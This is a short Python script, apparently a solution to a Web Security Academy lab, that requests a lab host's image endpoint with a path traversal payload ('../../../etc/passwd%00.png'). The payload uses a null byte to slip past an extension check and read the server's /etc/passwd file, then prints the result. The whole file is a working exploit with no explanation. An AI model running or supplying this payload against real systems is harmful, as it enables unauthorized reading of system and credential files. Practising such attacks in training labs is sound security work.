import requests

s = requests.Session()

if __name__ == "__main__":
    site = 'acf31f601edb2e2cc02b244500a10053.web-security-academy.net'
    path = '../../../etc/passwd%00.png'
    url = f'''https://{site}/image?filename={path}'''
    resp = s.get(url)
    print(resp.text)
